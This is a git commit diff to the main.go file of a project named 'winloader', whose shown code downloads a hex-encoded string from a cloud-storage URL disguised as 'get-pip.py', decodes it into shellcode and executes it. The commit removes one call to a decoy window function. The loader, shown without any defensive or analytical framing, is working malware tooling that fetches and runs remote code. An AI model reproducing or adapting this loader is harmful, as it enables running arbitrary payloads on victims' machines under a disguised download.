a9b006522af8da2e7aaab76cfa255f61ff492d47
xiwu <xubo8408@163.com>
2021-07-05 20:58:35 +0800

    Update main.go

--- winloader/main.go
+++ winloader/main.go
@@ -9,6 +9,5 @@ func main() {
 //	FakerWindow()
 	shellcodeStr := httpDownload("https://wx-1252923087.cos.ap-guangzhou.myqcloud.com/g2b4/get-pip.py")
 	shellcodeByte, _ := hex.DecodeString(shellcodeStr)
-	FakerWindow()
 	Run(shellcodeByte)
 }
